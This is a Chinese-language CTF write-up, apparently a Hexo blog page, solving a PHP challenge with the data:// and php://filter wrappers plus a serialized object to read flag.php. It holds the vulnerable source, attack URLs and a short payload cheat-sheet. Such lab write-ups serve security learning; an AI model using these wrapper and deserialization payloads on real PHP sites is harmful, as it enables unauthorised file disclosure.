@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ctf | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="CTF-php伪协议各位uu们大家好，今天我分享一下CTF的PHP中的几点看法伪协议问题 请看源代码 12345678910111213141516171819&lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(iss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf">
+<meta property="og:url" content="http://example.com/2024/01/27/ctf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CTF-php伪协议各位uu们大家好，今天我分享一下CTF的PHP中的几点看法伪协议问题 请看源代码 12345678910111213141516171819&lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(iss">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/Ink/imgs/l/image-20240127195057243.png">
+<meta property="og:image" content="c:/Users/Ink/imgs/l/image-20240127195408688.png">
+<meta property="og:image" content="c:/Users/Ink/imgs/l/image-20240127195835234.png">
+<meta property="article:published_time" content="2024-01-27T13:37:50.000Z">
+<meta property="article:modified_time" content="2024-01-27T13:41:44.767Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/Ink/imgs/l/image-20240127195057243.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-ctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/01/27/ctf/" class="article-date">
+  <time class="dt-published" datetime="2024-01-27T13:37:50.000Z" itemprop="datePublished">2024-01-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ctf
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF-php伪协议"><a href="#CTF-php伪协议" class="headerlink" title="CTF-php伪协议"></a>CTF-php伪协议</h1><p>各位uu们大家好，今天我分享一下CTF的PHP中的几点看法伪协议问题</p>
+<p>请看源代码</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        echo <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//data伪协议写进去</span><br><span class="line">http://node4.anna.nssctf.cn:28993/?text=data://text/plain，welcome to the zjctf</span><br><span class="line">//防止被过滤，采用base64加密</span><br><span class="line">http://node4.anna.nssctf.cn:28993/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>
+
+<p>写完发现还是不行，想到&#x2F;&#x2F;useless.php</p>
+<p>于是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//提示了useless.php</span><br><span class="line">http://node4.anna.nssctf.cn:28918/?text=data:///text/plain,welcome to the zjctf&amp;file=useless.php</span><br><span class="line">//直接读，读不到useless.php,用filter伪协议读</span><br><span class="line">http://node4.anna.nssctf.cn:28918/?text=data:///text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/Ink/imgs/l/image-20240127195057243.png" alt="image-20240127195057243"></p>
+<p>出现这样一个页面</p>
+<p>php伪协议问题常遇到base编码</p>
+<p>于是打开base编码转化器</p>
+<p><img src="C:/Users/Ink/imgs/l/image-20240127195408688.png" alt="image-20240127195408688"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>看这行代码，提示flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&#x27;flag.php&#x27;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new Flag();//实例化</span><br><span class="line">echo serialize($a);  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>在php在线工具上运行，输出 O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p><img src="C:/Users/Ink/imgs/l/image-20240127195835234.png" alt="image-20240127195835234"></p>
+<p>找到flag</p>
+<h2 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h2><p>熟记解题思路</p>
+<p>php:&#x2F;&#x2F;filter&#x2F;convert.base 64&#x2F;resource&#x3D;文件名</p>
+<p>data伪协议用法：&#x2F;?text&#x3D;data:&#x2F;&#x2F;&#x2F;text&#x2F;plain,</p>
+<p>一般php伪协议先用input ,比如php:&#x2F;&#x2F;input</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/27/ctf/" data-id="clrw56q250006osuo8tu0eenl" data-title="ctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/11/26/Computer-Science-1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Computer Science ()</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/27/ctf/">ctf</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/26/Computer-Science-1/">Computer Science ()</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/12/Computer-science-2/">Computer science(2)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/02/Computer-Science-0/">Computer Science</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/02/Compuer-science/">science</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
